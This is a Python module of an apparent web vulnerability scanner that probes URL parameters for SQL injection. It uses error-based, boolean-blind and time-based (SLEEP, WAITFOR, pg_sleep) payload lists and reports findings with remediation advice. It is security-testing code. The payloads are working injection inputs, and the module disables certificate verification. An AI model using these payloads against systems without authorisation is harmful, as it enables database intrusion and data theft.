"""
MulikaScans — SQL Injection Detection Module
Error-based and time-based blind SQLi detection.
"""

import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

ERROR_PAYLOADS = [
    # Basic quote breaks
    "'",
    "''",
    "`",
    "\\",
    # Classic OR-based tautologies
    "1' OR '1'='1",
    "1 OR 1=1--",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "') OR ('x'='x",
    "1' OR '1'='1'--",
    # UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT NULL--",
    # Stacked queries
    "'; SELECT 1--",
    "1; SELECT 1--",
    # Comment variations
    "1'--",
    "1'/*",
    "1' #",
    # Filter bypass
    "1'||'1'='1",
    "1' oR '1'='1",
    "1' Or '1'='1",
]

# Boolean-based blind payloads
# (true_payload, false_payload) — we compare response lengths
BOOLEAN_PAYLOADS = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1 AND 1=1--",  "1 AND 1=2--"),
    ("1' AND 'a'='a","1' AND 'a'='b"),
    ("1) AND (1=1",  "1) AND (1=2"),
]

TIME_PAYLOADS = [
    ("1' AND SLEEP(3)--",           3),
    ("1; WAITFOR DELAY '0:0:3'--",  3),
    ("1' AND pg_sleep(3)--",        3),
    ("1 AND SLEEP(3)--",            3),
    ("1') AND SLEEP(3)--",          3),
    ("1 OR SLEEP(3)--",             3),
]

DB_ERRORS = [
    # MySQL
    "sql syntax", "mysql_fetch", "mysql_num_rows",
    "you have an error in your sql syntax",
    "warning: mysql", "supplied argument is not a valid mysql",
    "column count doesn't match", "table", "mysql error",
    # Oracle
    "ora-", "oracle error", "oracle database",
    # MSSQL
    "microsoft sql native client", "unclosed quotation mark",
    "microsoft ole db", "odbc microsoft access",
    "syntax error converting", "incorrect syntax near",
    "invalid object name", "mssql",
    # PostgreSQL
    "pg_query", "pg_exec", "psql", "postgresql",
    "unterminated string", "pgsql",
    # SQLite
    "sqlite3.operationalerror", "sqlite_error",
    # Generic
    "unknown column", "invalid column name",
    "division by zero", "sql error", "database error",
    "query failed", "sql statement", "db error",
    "invalid sql", "syntax error", "operationalerror",
]

# Database fingerprint — map error signatures to DB type
DB_FINGERPRINTS = {
    "mysql": ["mysql_fetch", "you have an error in your sql syntax", "warning: mysql"],
    "mssql": ["microsoft sql native client", "unclosed quotation mark", "incorrect syntax near"],
    "oracle": ["ora-", "oracle error"],
    "postgresql": ["pg_query", "pg_exec", "postgresql", "psql"],
    "sqlite": ["sqlite3.operationalerror", "sqlite_error"],
}


def _inject_param(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _fingerprint_db(body_lower):
    for db, sigs in DB_FINGERPRINTS.items():
        if any(s in body_lower for s in sigs):
            return db
    return "unknown"


def test_sqli(url, timeout=10, quick_mode=False, session=None):
    _req = session if session is not None else requests
    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    if not qs:
        return findings

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner)"})

    error_payloads = ERROR_PAYLOADS[:6] if quick_mode else ERROR_PAYLOADS

    for param in qs:
        found = False

        # ── 1. Error-based detection ───────────────────────────────────────────
        for payload in error_payloads:
            if found:
                break
            test_url = _inject_param(url, param, payload)
            try:
                resp = session.get(test_url, timeout=timeout,
                                   allow_redirects=True, verify=False)
                body_lower = resp.text.lower()
                for err in DB_ERRORS:
                    if err in body_lower:
                        db_type = _fingerprint_db(body_lower)
                        findings.append({
                            "name": "SQL Injection (Error-Based)",
                            "type": "SQL Injection",
                            "severity": "Critical",
                            "cvss_score": 9.8,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            "category": "sqli",
                            "url_affected": url,
                            "parameter": param,
                            "evidence": (
                                f"Database error '{err}' triggered by payload '{payload}'. "
                                f"Detected DB engine: {db_type}"
                            ),
                            "request_data": test_url,
                            "response_data": resp.text[:600],
                            "cwe_id": "CWE-89",
                            "owasp_category": "A03:2021",
                            "detail": (
                                f"Parameter '{param}' is injectable. "
                                f"The database engine appears to be {db_type}. "
                                "Error-based SQLi allows an attacker to enumerate the "
                                "entire database schema and extract data by reading DB error messages."
                            ),
                            "remediation": (
                                "1. Use parameterised queries / prepared statements for ALL DB operations. "
                                "2. Never concatenate user input into SQL strings. "
                                "3. Apply least-privilege to DB accounts (no DROP/GRANT). "
                                "4. Suppress detailed DB error messages in production. "
                                "5. Use a WAF as an additional defence layer."
                            ),
                            "references": [
                                "https://owasp.org/www-community/attacks/SQL_Injection",
                                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                                "https://portswigger.net/web-security/sql-injection",
                                "https://cwe.mitre.org/data/definitions/89.html",
                            ],
                        })
                        found = True
                        break
            except requests.RequestException:
                pass

        if found or quick_mode:
            continue

        # ── 2. Boolean-based blind detection ──────────────────────────────────
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            try:
                true_url  = _inject_param(url, param, true_payload)
                false_url = _inject_param(url, param, false_payload)
                r_true  = session.get(true_url,  timeout=timeout, verify=False)
                r_false = session.get(false_url, timeout=timeout, verify=False)
                len_diff = abs(len(r_true.text) - len(r_false.text))
                # Significant length difference with same status code indicates boolean injection
                if (r_true.status_code == r_false.status_code and
                        len_diff > 20 and
                        r_true.status_code == 200):
                    findings.append({
                        "name": "SQL Injection (Boolean-Based Blind)",
                        "type": "SQL Injection",
                        "severity": "Critical",
                        "cvss_score": 9.8,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "category": "sqli",
                        "url_affected": url,
                        "parameter": param,
                        "evidence": (
                            f"TRUE payload ({true_payload!r}) returned {len(r_true.text)} bytes, "
                            f"FALSE payload ({false_payload!r}) returned {len(r_false.text)} bytes "
                            f"— difference of {len_diff} bytes indicates boolean-based blind SQLi"
                        ),
                        "request_data": f"TRUE: {true_url}\nFALSE: {false_url}",
                        "response_data": r_true.text[:400],
                        "cwe_id": "CWE-89",
                        "owasp_category": "A03:2021",
                        "detail": (
                            f"Parameter '{param}' behaves differently for always-true and "
                            f"always-false SQL conditions, confirming blind SQL injection. "
                            "An attacker can use binary search to extract the entire database "
                            "character by character without any error messages."
                        ),
                        "remediation": (
                            "Use parameterised queries. Even without visible errors, "
                            "blind SQLi allows full data extraction."
                        ),
                        "references": [
                            "https://portswigger.net/web-security/sql-injection/blind",
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                    })
                    found = True
                    break
            except requests.RequestException:
                pass

        if found:
            continue

        # ── 3. Time-based blind detection ─────────────────────────────────────
        for payload, expected_delay in TIME_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            try:
                t_start = time.time()
                session.get(test_url, timeout=timeout + expected_delay + 3,
                            allow_redirects=True, verify=False)
                elapsed = time.time() - t_start
                if elapsed >= expected_delay * 0.9:
                    findings.append({
                        "name": "SQL Injection (Time-Based Blind)",
                        "type": "SQL Injection",
                        "severity": "Critical",
                        "cvss_score": 9.8,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "category": "sqli",
                        "url_affected": url,
                        "parameter": param,
                        "evidence": (
                            f"Response delayed {elapsed:.1f}s using payload '{payload}' "
                            f"(expected ≥{expected_delay}s) — confirms time-based blind SQLi"
                        ),
                        "request_data": test_url,
                        "response_data": "",
                        "cwe_id": "CWE-89",
                        "owasp_category": "A03:2021",
                        "detail": (
                            f"Parameter '{param}' causes the database to delay responses "
                            "based on injected sleep commands, confirming SQL injection. "
                            "The database is executing attacker-controlled SQL."
                        ),
                        "remediation": (
                            "Use parameterised queries for all database operations. "
                            "Validate and whitelist all user inputs."
                        ),
                        "references": [
                            "https://portswigger.net/web-security/sql-injection/blind",
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                    })
                    found = True
                    break
            except requests.RequestException:
                pass

    return findings
